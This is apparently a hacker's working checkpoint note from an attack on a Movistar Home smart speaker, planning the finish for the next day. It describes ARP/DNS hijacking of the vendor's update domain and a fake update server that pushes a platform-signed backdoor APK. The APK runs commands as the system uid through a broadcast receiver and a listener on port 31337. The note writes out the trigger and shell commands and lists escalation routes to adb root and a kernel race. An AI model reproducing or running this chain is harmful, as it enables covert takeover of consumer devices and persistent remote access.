# CHECKPOINT v2 — off-kernel chain: root cause found, 2-minute finish tomorrow
Date: 2026-10-11 23:15. Status: parked for the night. `job.sh` = idle-night (safe).

## THE ROOT CAUSE OF TONIGHT'S FAILURES (found, not fixed)

**Our SNTP server (port 123, needs sudo) is DOWN.** The device's NTP/DNS all
point at the Mac, so at the 22:26 boot the speaker got no time sync →
**clock stuck at Jan 1, 1970** (proof: idle-night job printed
`Thu Jan 1 01:31:30 CET 1970`; NTP query at 22:26:35 got no reply).

With a 1970 clock the launcher's boot chain (LoadingUseCase → auth) dies early
(TLS "not yet valid" to real Movistar cloud, expired JWTs) → never reaches
**`updaterSubscriber.start()`** — the production step where the FOREGROUND
launcher starts the updater's PackageService via its Router
(`RoutableStartUpdater`, a ServiceRoutable). That's who normally boots the
updater, and it's why the updater made zero requests after this boot
(vs. after the earlier 21:10 boot, when backend queries DID happen).

It also explains why my direct `/system/bin/am start-foreground-service` starts
returned rc=0 but no process ever appeared: the updater likely crashes on cold
start under the 1970 clock (auth/JWT/crashlytics init).

## TOMORROW'S FINISH (2 minutes)

1. On the Mac: `sudo python3 ~/movistar-home-tr069/sntp_server.py`
   (keep it running — terminal or `nohup`).
2. **Power-cycle the speaker once.**
3. Watch from the Mac (no poller needed):
   - `mitm.log`: NTP query at boot, then `*** HIJACKING api.es-pro.movistar-home.com`
   - `troya_backend.log`: `GET /api/v1/updates/sw` → `GET /packages.zip`
   - Win check: `echo id | nc <device-ip> 31337` → expect `uid=1000(system)`
4. If installed but the receiver wasn't fired (it's broadcast-triggered, not
   boot-triggered), fire it once via poller:
   `am broadcast -a com.mh.pwn.PWN --es cmd id` (Termux `am`, NOT /system/bin/am —
   see "am quirks" below).

## What is staged and verified

- `troya/pwn.apk` — `com.mh.pwn`, `sharedUserId="android.uid.system"`,
  platform-signed (AOSP test key `CN=Android`), payload = exported receiver
  `com.mh.pwn.PWN` (exec `--es cmd` as system uid, logs
  /sdcard/mhpwn.log + /data/local/tmp/mhpwn.log) + persistent exec server on
  **:31337** (line in → output lines → `%%EOT%%`). MD5 68715f5d5ae275ff1f2f6c3db5e149c9.
- `troya/packages.zip` = `descriptor` (bundle_version "999", signature=MD5 above)
  + `pwn.apk` — matches the REAL updater flow reverse-engineered from smali
  (/tmp/ups): `/api/v1/updates/sw` → download `url` → **unzip** → parse
  `packages/descriptor` → `IsAppValid` passes any non-updater package →
  `needsUpdate` TRUE for a new package (NameNotFoundException) → MD5 check →
  `silentInstallPackage` (PackageInstaller, INSTALL_PACKAGES as system).
- Backend `fake_troya.py` :443 running with timestamps (`troya_backend.log`),
  serving `/api/v1/updates/sw → {"hasUpdate":true,"url":"https://api.es-pro.movistar-home.com/packages.zip"}`.
- DNS hijack (arp_dns_spoof) still running and working (verified 22:43:59).
- adb keypair at /tmp/adbkey(.pub), embedded in the payload.

## am quirks learned tonight (don't rediscover)

- Termux `am` = TermuxAm reimplementation: does NOT know `start-foreground-service`,
  DOES work for broadcasts. System `/system/bin/am` needs explicit `--user 0`
  (else "user -2" SecurityException), and its `broadcast --user 0` crashes on an
  8.1 AMS bug ("Calling application did not provide package name").
- `ps -A` from Termux shows ONLY own processes (SELinux) — useless for liveness.
  Ground truth for updater liveness = DNS hijack log + backend log.
- `ACTION_UPDATE_APPS` handler: launcher `UpdateUseCase` sends it after boot;
  broadcast `result=0` is normal (unordered) and proves nothing.

## Escalation once payload runs (uid 1000, platform-signed)

Payload reports `ro.build.type` / `ro.debuggable` / `getenforce` on first cmd.
- userdebug → `adb_enabled=1` (payload already does) + adbd restart → adb root.
- user → shell via adbd, or pick a system-uid escalation; kernel af_unix is
  PARKED but its race is confirmed hot (pre≈0 panic) — see
  reports/2026-10-11-AF_UNIX-0920-GPZ-HANDOFF.md.

## History tonight (for the record)

- JOB-106: DNS OK survived reboot; Termux am couldn't start the service.
- JOB-107: /system/bin/am without --user 0 → SecurityException (user -2).
- JOB-108: --user 0 fixed it (starts rc=0) but no install — because the updater
  crashes under the 1970 clock / never started.
- JOB-109: full diagnostics — confirmed system-am broadcast bug, Termux am
  works, no backend traffic at all → led to SNTP/1970 root cause.
